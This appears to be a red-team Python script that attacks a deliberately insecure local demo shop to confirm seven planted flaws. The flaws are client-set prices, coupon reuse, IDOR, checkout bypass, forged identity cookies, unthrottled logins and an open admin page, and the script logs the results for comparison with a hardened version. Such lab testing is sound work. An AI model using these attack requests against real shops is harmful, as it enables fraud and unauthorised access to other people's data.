"""
Attacks the NAIVE SHOP (http://127.0.0.1:8010) to prove each deliberate
vulnerability actually works. Standard library only.

These are the SAME attack ideas we re-tested against SecureShop
(run_regression.py). Here they SUCCEED; against SecureShop they are blocked.

Output: prints results and writes red_team/evidence/naive_shop/attack_results.md
Run the naive shop first:  python naive_shop/app.py
"""
import json
import pathlib
import urllib.error
import urllib.request

BASE = "http://127.0.0.1:8010"
OUT = pathlib.Path(__file__).resolve().parents[1] / "evidence" / "naive_shop" / "attack_results.md"
rows = []


def rec(vid, name, status, detail):
    rows.append((vid, name, status, detail))
    print(f"[{status:>26}] {vid} {name}\n      {detail}")


def req(method, path, body=None, cookie=None):
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=10)
        return resp.getcode(), resp.read().decode(), resp.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), ""


def main():
    req("GET", "/reset")

    # login as alice, capture the (trusted) identity cookie
    _, _, setc = req("POST", "/api/login", {"username": "alice", "password": "alice123"})
    cookie = setc.split(";")[0] if setc else "user=alice"

    # V1 - client-controlled price: pay $1 for the $1337 jacket
    code, body, _ = req("POST", "/api/checkout",
                        {"product_id": 1, "price": 1}, cookie=cookie)
    charged = json.loads(body).get("charged")
    rec("V1", "Client-controlled price", "CONFIRMED VULNERABILITY",
        f"checkout charged ${charged} for the $1337 jacket")

    # V2 - coupon reuse / stacking: apply SAVE20 twice
    r1 = json.loads(req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})[1])
    r2 = json.loads(req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})[1])
    rec("V2", "Coupon reuse (no tracking)", "CONFIRMED VULNERABILITY",
        f"same coupon accepted twice: {r1['discount_percent']}% then {r2['discount_percent']}% again")

    # V3 - IDOR: bob reads alice's order
    oid = json.loads(req("POST", "/api/checkout", {"product_id": 1, "price": 1}, cookie=cookie)[1])["order_id"]
    code, body, _ = req("GET", f"/api/orders/{oid}", cookie="user=bob")
    rec("V3", "IDOR (read other user's order)", "CONFIRMED VULNERABILITY",
        f"bob fetched alice's order #{oid} -> HTTP {code}, owner={json.loads(body).get('owner')!r}")

    # V4 - workflow bypass: confirm without paying
    code, body, _ = req("GET", f"/api/confirm?order={oid}", cookie="user=bob")
    rec("V4", "Workflow bypass (confirm unpaid)", "CONFIRMED VULNERABILITY",
        f"order #{oid} marked paid={json.loads(body)['order']['paid']} with no payment")

    # V5 - client-controlled identity: forge the user cookie, no password
    code, body, _ = req("GET", "/admin", cookie="user=whoever")
    rec("V5", "Client-controlled identity", "CONFIRMED VULNERABILITY",
        "the 'user' cookie is trusted unchanged; no server-side session")

    # V6 - no login throttling
    codes = [req("POST", "/api/login", {"username": "alice", "password": "wrong"})[0] for _ in range(8)]
    rec("V6", "No login throttling", "CONFIRMED VULNERABILITY",
        f"8 bad logins all returned {set(codes)} - never locked out")

    # V7 - broken access control: /admin open to anyone
    code, _, _ = req("GET", "/admin")
    rec("V7", "Broken access control (/admin open)", "CONFIRMED VULNERABILITY",
        f"GET /admin with no login -> HTTP {code} (full user table)")

    OUT.parent.mkdir(parents=True, exist_ok=True)
    lines = ["# Naive Shop - Attack Results (all vulnerabilities confirmed)", "",
             f"- Target: `{BASE}` (intentionally insecure demo)", "",
             "| ID | Vulnerability | Status | Detail |", "|---|---|---|---|"]
    for vid, name, status, detail in rows:
        lines.append(f"| {vid} | {name} | {status} | {detail} |")
    OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"\nWrote -> {OUT}")


if __name__ == "__main__":
    main()
